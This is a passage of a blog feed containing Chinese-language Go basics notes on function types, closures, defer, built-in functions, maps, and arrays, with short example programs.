class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span> <span class="type">int</span></span><br></pre></td></tr></table></figure><p>上面语句定义了一个叫calcFuncType类型，它是一种函数类型，这种函数接收两个int类型的参数并且返回一个int类型的返回值。</p><p>简而言之，凡是满足<code>接收两个int类型的参数并且返回一个int类型的返回值</code>都是calcFuncType类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x+y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sub</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x-y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面add和sub都是calcFuncType类型</p><h4 id="函数类型变量">函数类型变量</h4><p>我们可以声明函数类型的变量并且为该变量赋值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> func1 calcFuncType</span><br><span class="line">func1 = add</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Type of func1:%T\n&quot;</span>, func1) <span class="comment">//output:Type of func1:main.calcFuncType</span></span><br><span class="line">fmt.Println(func1(<span class="number">1</span>, <span class="number">2</span>))<span class="comment">//可以像普通函数一样去调用</span></span><br><span class="line"></span><br><span class="line">func2 := sub</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Type of func2:%T\n&quot;</span>, func2) <span class="comment">//output:Type of func2:func(int, int) int</span></span><br><span class="line">fmt.Println(func2(<span class="number">2</span>, <span class="number">1</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高阶函数">高阶函数</h3><p>高阶函数分为</p><ul><li>函数作参数</li><li>函数作返回值</li></ul><h4 id="函数作参数">函数作参数</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calc</span><span class="params">(x, y <span class="type">int</span>/*第一第二个参数*/, op <span class="keyword">func</span>(<span class="type">int</span>, <span class="type">int</span>)</span></span> <span class="type">int</span><span class="comment">/*第三个参数*/</span>) <span class="type">int</span><span class="comment">/*返回值*/</span> &#123;</span><br><span class="line"><span class="keyword">return</span> op(x, y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ret1 := calc(<span class="number">10</span>, <span class="number">20</span>, add)</span><br><span class="line">ret2 := calc(<span class="number">20</span>, <span class="number">10</span>, sub)</span><br><span class="line">fmt.Println(ret1, ret2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数第一第二个参数为操作数，第三个参数为操作。</p><p>操作的函数沿用了上面例子的两个函数。</p><h4 id="函数作返回值">函数作返回值</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">do</span><span class="params">(s <span class="type">string</span>)</span></span> (<span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span> <span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> s &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;+&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> add, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;-&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> sub, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">err := errors.New(<span class="string">&quot;无法识别的操作符&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="匿名函数">匿名函数</h3><p>函数内部是不能再定义一个函数的，但是匿名函数是个例外</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span><span class="params">(参数)</span></span>(返回值)&#123;</span><br><span class="line">    函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匿名函数由于没有函数名，因此不能像普通函数一样调用，它需要保存到某个变量，或者立即执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//保存到变量</span></span><br><span class="line">add := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(x + y)</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">10</span>, <span class="number">20</span>)<span class="comment">//跟普通函数一样执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//立即执行并返回值</span></span><br><span class="line">ret := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y</span><br><span class="line">&#125;(<span class="number">10</span>, <span class="number">20</span>)<span class="comment">//直接在后面加上实参</span></span><br><span class="line">fmt.Println(ret)</span><br></pre></td></tr></table></figure><p>匿名函数多用于实现会调函数和闭包。</p><h3 id="闭包">闭包</h3><p>闭包简而言之就是<code>函数+引用环境</code>。</p><p>闭包的引用环境包括了：闭包函数内部的非全局变量、常量、函数等。</p><p>下面是闭包的一个简单使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//把匿名函数作为返回值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">func1</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">str := <span class="string">&quot;world&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello&quot;</span>+str)</span><br><span class="line">        <span class="comment">//函数体会现在内层寻找变量，找不到则会向外层找</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">f1 := func1() <span class="comment">//f1相当于是一个闭包，包含了匿名函数本身和外层的str</span></span><br><span class="line">f1()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子非常简单，但是没能体现出闭包函数的作用。</p><p>接下来我们展示一个添加后缀名的简单函数，体会一下闭包在其中发挥的作用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addSuffixFunc</span><span class="params">(suffix <span class="type">string</span>)</span></span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(name, suffix) &#123; <span class="comment">//检测是否有后缀</span></span><br><span class="line"><span class="keyword">return</span> name + suffix <span class="comment">//suffix为外层函数定义的</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">addJPG := addSuffixFunc(<span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">fmt.Println(addJPG(<span class="string">&quot;Hello&quot;</span>)) <span class="comment">//output:Hello.jpg</span></span><br><span class="line">addMP3 := addSuffixFunc(<span class="string">&quot;.mp3&quot;</span>)</span><br><span class="line">fmt.Println(addMP3(<span class="string">&quot;World&quot;</span>)) <span class="comment">//output:World.mp3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看一个更复杂一点的例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddSub</span><span class="params">(base <span class="type">int</span>)</span></span> (<span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">int</span>, <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">int</span>) &#123;</span><br><span class="line">add := <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">base += i</span><br><span class="line"><span class="keyword">return</span> base</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub := <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">base -= i</span><br><span class="line"><span class="keyword">return</span> base</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> add, sub</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a, s := AddSub(<span class="number">100</span>)</span><br><span class="line">ret1 := a(<span class="number">100</span>) <span class="comment">//base = 100(base)+100(i)</span></span><br><span class="line">fmt.Println(ret1) <span class="comment">//output:200</span></span><br><span class="line">ret2 := s(<span class="number">150</span>) <span class="comment">//base = 200(base)-150(i)</span></span><br><span class="line">fmt.Println(ret2) <span class="comment">//output:50</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="延迟处理defer">延迟处理defer</h3><p>defer关键字可以让后面跟随的语句进行延迟处理。多个defer遵循栈的顺序，即先进后出的顺序。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="number">3</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start</span><br><span class="line">end</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>Go语言中return语句在底层并不是原子操作，它分为给返回值赋值和RET指令两部。而defer语句的执行实际便是在赋值完成后，RET之前，即先完成计算然后压入栈后等待返回。</p><p>由于是将返回值提前压入栈，后续对给返回值赋值的变量作出任何修改都不会对返回值发生任何影响。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x := <span class="number">10</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">(a <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(a)</span><br><span class="line">&#125;(x)</span><br><span class="line">x++</span><br></pre></td></tr></table></figure><p>defer延迟调用的特性往往会用在处理资源释放问题上：资源清理、文件关闭、解锁及记录时间等。</p><p>推荐文章：<a href="https://blog.csdn.net/m0_46251547/article/details/123762669">https://blog.csdn.net/m0_46251547/article/details/123762669</a></p><p><strong>defer有关面试题</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calc</span><span class="params">(index <span class="type">string</span>, a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">ret := a + b</span><br><span class="line">fmt.Println(index, a, b, ret)</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">x := <span class="number">1</span></span><br><span class="line">y := <span class="number">2</span></span><br><span class="line"><span class="keyword">defer</span> calc(<span class="string">&quot;AA&quot;</span>, x, calc(<span class="string">&quot;A&quot;</span>, x, y))</span><br><span class="line">x = <span class="number">10</span></span><br><span class="line"><span class="keyword">defer</span> calc(<span class="string">&quot;BB&quot;</span>, x, calc(<span class="string">&quot;B&quot;</span>, x, y))</span><br><span class="line">y = <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果是什么？</p><p>答案：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A 1 2 3</span><br><span class="line">B 10 2 12</span><br><span class="line">BB 10 12 22</span><br><span class="line">AA 1 3 4</span><br></pre></td></tr></table></figure><p>由于defer注册要延迟执行的函数时<strong>该函数所有的参数都需要确定其值</strong>，因此执行步骤如下</p><ol><li>执行<code>calc(&quot;A&quot;, x, y)</code></li><li>将<code>calc(&quot;AA&quot;, x, calc(&quot;A&quot;, x, y))</code>压入栈</li><li>执行<code>calc(&quot;B&quot;, x, y)</code></li><li>将<code>calc(&quot;BB&quot;, x, calc(&quot;B&quot;, x, y))</code>压入栈</li><li><code>calc(&quot;BB&quot;, x, calc(&quot;B&quot;, x, y))</code>出栈</li><li><code>calc(&quot;AA&quot;, x, calc(&quot;A&quot;, x, y))</code>出栈</li></ol><h2 id="内置函数">内置函数</h2><table><thead><tr><th style="text-align:center">内置函数</th><th style="text-align:center">介绍</th></tr></thead><tbody><tr><td style="text-align:center">close</td><td style="text-align:center">主要用来关闭channel</td></tr><tr><td style="text-align:center">len</td><td style="text-align:center">用来求长度，比如string、array、slice、map、channel</td></tr><tr><td style="text-align:center">new</td><td style="text-align:center">用来分配内存，主要用来分配值类型，比如int、struct。返回的是指针</td></tr><tr><td style="text-align:center">make</td><td style="text-align:center">用来分配内存，主要用来分配引用类型，比如chan、map、slice</td></tr><tr><td style="text-align:center">append</td><td style="text-align:center">用来追加元素到数组、slice中</td></tr><tr><td style="text-align:center">panic和recover</td><td style="text-align:center">用来做错误处理</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（4）：Map</title>
      <link href="/2023/01/28/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%EF%BC%9AMap/"/>
      <url>/2023/01/28/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%EF%BC%9AMap/</url>
      
        <content type="html"><![CDATA[<h2 id="map">map</h2><p>map是Go语言中提供的映射关系的容器类数据结构，其内部使用散列表(hash)实现。</p><p>map是一种无序的基于<code>key-value</code>的数据结构，Go语言中的map是引用类型，必须初始化才能使用。</p><h3 id="构建map">构建map</h3><h4 id="var">var</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[KeyType]ValueType</span><br></pre></td></tr></table></figure><h4 id="make">make()</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[KeyType]ValueType,[<span class="built_in">cap</span>])</span><br></pre></td></tr></table></figure><p>cap为可选参数</p><h4 id="使用字面值">使用字面值</h4><p>map支持在声明的时候填充元素</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="keyword">map</span>[KeyType]ValueType&#123;</span><br><span class="line">    <span class="string">&quot;Key1&quot;</span>:value1,</span><br><span class="line">    <span class="string">&quot;Key2&quot;</span>:value2,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大括号内也可以为空</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>通过使用空接口，可以在同一个map中存储不同类型的value</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;张三&quot;</span>, <span class="comment">//string</span></span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,   <span class="comment">//int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="crud">CRUD</h3><h4 id="追加键值对">追加键值对</h4><p>直接通过键+值的方式就可以追加一堆键值对</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m[<span class="string">&quot;李四&quot;</span>] = <span class="number">20</span></span><br><span class="line">m[<span class="string">&quot;王五&quot;</span>] = <span class="number">22</span></span><br></pre></td></tr></table></figure><h4 id="判断某个键是否存在">判断某个键是否存在</h4><p>Go语言在通过Key访问键值对时，会返回两个值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value, ok := <span class="keyword">map</span>[key]</span><br></pre></td></tr></table></figure><p>value是key所对的值，<code>ok</code>是该值是否存在，为一个bool</p><p>若值不存在，则value会得到一个0值，且ok会得到false</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">scoreMap := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;</span><br><span class="line">    <span class="string">&quot;张三&quot;</span> : <span class="number">90</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v, ok := scoreMap[<span class="string">&quot;张三&quot;</span>]; ok &#123;</span><br><span class="line">fmt.Println(v)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;查无此人&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="遍历map">遍历map</h4><p>Go语言中使用<code>for range</code>遍历map</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">scoreMap := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;</span><br><span class="line"><span class="string">&quot;张三&quot;</span>: <span class="number">90</span>,</span><br><span class="line"><span class="string">&quot;李四&quot;</span>: <span class="number">95</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> scoreMap &#123;</span><br><span class="line">fmt.Print(k + <span class="string">&quot; &quot;</span>)</span><br><span class="line">fmt.Println(v)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> scoreMap &#123; <span class="comment">//只遍历value</span></span><br><span class="line">fmt.Println(v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**注意：**由于map本身的性质，因此遍历的顺序与添加键值对的顺序无关</p><p>有没有办法指定顺序遍历呢？是可以的。</p><h4 id="指定顺序遍历">指定顺序遍历</h4><p>具体步骤：</p><ol><li>构建一个切片，将key存入</li><li>对切片排序</li><li>按照切片中key的顺序遍历map</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.构建一个切片, 并将key存入</span></span><br><span class="line"><span class="keyword">var</span> keys = <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>, <span class="number">200</span>)</span><br><span class="line"><span class="keyword">for</span> key := <span class="keyword">range</span> scoreMap &#123;</span><br><span class="line">keys = <span class="built_in">append</span>(keys, key)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.对切片进行排序</span></span><br><span class="line">sort.Strings(keys)</span><br><span class="line"><span class="comment">//3.按照切片中key的顺序遍历map</span></span><br><span class="line"><span class="keyword">for</span> _, key := <span class="keyword">range</span> keys &#123;</span><br><span class="line">fmt.Println(key, scoreMap[key])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="修改值">修改值</h4><p>分为两种情况</p><ul><li><p>一般情况下，直接用下标访问修改即可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scoreMap[<span class="string">&quot;张三&quot;</span>] += <span class="number">10</span></span><br></pre></td></tr></table></figure></li><li><p>如果值是一个结构体等复杂结构，就不能直接修改下标访问到的结构体中的内部值，<strong>需要重新构建一个新的结构体，重新给map赋值</strong></p></li></ul><h4 id="删除键值对">删除键值对</h4><p>使用<code>delete()</code>内建函数从map中删除一组键值对</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">delete</span>(<span class="keyword">map</span>, key)</span><br></pre></td></tr></table></figure><p>map为要删除键值对的map，key为所对的键，例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">delete</span>(scoreMap, <span class="string">&quot;张三&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="切片相关">切片相关</h3><h4 id="元素为map类型的切片">元素为map类型的切片</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.切片的初始化</span></span><br><span class="line"><span class="comment">//构建了一个长度容量为3的切片，只完成了切片的初始化，map均为nil值</span></span><br><span class="line"><span class="keyword">var</span> mapSlice = <span class="built_in">make</span>([]<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">//2.map的初始化</span></span><br><span class="line">mapSlice[<span class="number">0</span>] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line"><span class="comment">//3.即可正常对mapSlice追加键值对</span></span><br><span class="line">mapSlice[<span class="number">0</span>][<span class="string">&quot;张三&quot;</span>] = <span class="number">100</span></span><br><span class="line">fmt.Println(mapSlice)</span><br></pre></td></tr></table></figure><h4 id="值为切片类型的map">值为切片类型的map</h4><p>构建一个各个国家包含的城市的map：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.map的初始化，没有完成切片的初始化</span></span><br><span class="line"><span class="keyword">var</span> sliceMap = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>][]<span class="type">string</span>)</span><br><span class="line"><span class="comment">//2.切片初始化</span></span><br><span class="line">key := <span class="string">&quot;中国&quot;</span></span><br><span class="line">sliceMap[key] = <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>, <span class="number">8</span>) <span class="comment">//长度0,容量8的</span></span><br><span class="line"><span class="comment">//3.添加元素，测试</span></span><br><span class="line">sliceMap[key] = <span class="built_in">append</span>(sliceMap[key], <span class="string">&quot;北京&quot;</span>, <span class="string">&quot;上海&quot;</span>)</span><br><span class="line">fmt.Println(sliceMap)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础笔记（3）：数组、切片</title>
      <link href="/2023/01/27/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9A%E6%95%B0%E7%BB%84%E3%80%81%E5%88%87%E7%89%87/"/>
      <url>/2023/01/27/golang%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9A%E6%95%B0%E7%BB%84%E3%80%81%E5%88%87%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="数组">数组</h2><p>与大多数语言中的数组都类似，Go语言的数组也是<strong>从声明时就确定，使用时可以修改数组成员，但是数组大小不可变化</strong>。但是实际上，Go中的数组并不常用，而常用为切片。</p><h3 id="声明">声明</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 数组变量名 [元素数量]T</span><br></pre></td></tr></table></figure><h3 id="初始化">初始化</h3><h4 id="基础写法">基础写法</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> testArray [<span class="number">3</span>]<span class="type">int</span>                        <span class="comment">//数组会初始化为int类型的零值</span></span><br><span class="line"><span class="keyword">var</span> numArray = [<span class="number">3</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125;                 <span class="comment">//使用指定的初始值完成初始化</span></span><br><span class="line"><span class="keyword">var</span> cityArray = [<span class="number">3</span>]<span class="type">string</span>&#123;<span class="string">&quot;北京&quot;</span>, <span 